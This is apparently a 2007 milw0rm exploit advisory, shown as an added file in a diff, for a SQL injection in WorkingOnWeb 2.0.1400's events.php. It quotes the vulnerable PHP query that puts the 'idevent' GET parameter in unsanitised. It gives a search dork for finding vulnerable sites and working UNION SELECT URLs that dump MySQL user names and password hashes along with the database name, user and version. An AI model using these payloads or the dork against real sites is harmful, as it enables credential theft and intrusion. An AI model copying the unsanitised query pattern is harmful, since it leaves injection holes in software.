@@ -1,0 +1,31 @@
+WorkingOnWeb 2.0.1400 Remote SQL Injection
+d0rk: Powered by WorkingOnWeb 2.0.1400
+bug found by ka0x - D.O.M TEAM
+contact: ka0x01[!]gmail.com
+we: ka0x, an0de, xarnuz, s0cratex, Hendrix
+#from spain
+
+
+1: <?
+2: $query = "SELECT cnf_shortname, cnf_name, cnf_begindate, cnf_enddate, cnf_city, cnf_email, cnf_url, cnf_imgpath, cnf_country ".
+3:          "FROM conference ".
+4:          "WHERE id_conference = $HTTP_GET_VARS[idevent] ".
+5:          " AND cnf_private=0";
+6: $result = mysql_query($query);
+7: $row = mysql_fetch_object($result);
+8: ?>
+     
+vulnerability in line 4.
+     
+user and password from mysql.user :
+http://localhost/events.php?idevent=-1/**/union/**/select/**/concat(user,0x203a3a20,password),null,0,0,0,0,0,0,0/**/from/**/mysql.user/*
+
+Information:
+http://localhost/events.php?idevent=-1/**/union/**/select/**/user(),2,3,4,1,1,1,1,1/*
+http://localhost/events.php?idevent=-1/**/union/**/select/**/database(),2,3,4,1,1,1,1,1/*
+http://localhost/events.php?idevent=-1/**/union/**/select/**/version(),2,3,4,1,1,1,1,1/*
+
+-- 
+// ka0x
+
+# milw0rm.com [2007-11-24]
